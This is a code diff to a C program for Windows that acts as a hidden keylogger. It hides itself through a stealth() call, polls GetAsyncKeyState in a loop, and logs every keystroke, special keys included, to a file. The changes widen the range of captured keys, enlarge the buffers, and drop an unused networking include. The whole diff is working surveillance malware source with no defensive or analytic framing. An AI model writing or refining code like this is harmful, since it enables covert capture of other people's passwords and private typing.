@@ -3,7 +3,6 @@
 
 #include <stdio.h>
 #include <string.h>
-#include <winsock2.h>
 #include <windows.h>
 
 void stealth();
@@ -23,7 +22,7 @@ int save(int key, char *filename) {                          //save function tha
 
     switch (key) {                                              //check if the key pressed was one of these special keys 
         case 8: fprintf(fileptr, "{BACKSPACE}"); break;
-        case 13: fprintf(fileptr, "{ENTER}"); break;
+        case 13: fprintf(fileptr, "{ENTER}\n"); break;
         case 32: fprintf(fileptr, " "); break;
         case VK_TAB: fprintf(fileptr, "{TAB}"); break;
         case VK_SHIFT: fprintf(fileptr, "{SHIFT}"); break;
@@ -46,8 +45,8 @@ int main()
 {
     stealth();
     SYSTEMTIME curr;
-    char c,filename[30],sessionname[15];
-    DWORD buffersize=15;
+    char c,filename[40],sessionname[25];
+    DWORD buffersize=25;
 
     GetSystemTime(&curr);
 
@@ -66,7 +65,7 @@ int main()
 
     while (1) {
         Sleep(10);
-        for (int c = 0; c < 191; c++) {
+        for (int c = 0; c < 255; c++) {
             if (GetAsyncKeyState(c) == -32767)
                 save(c, filename);
         }
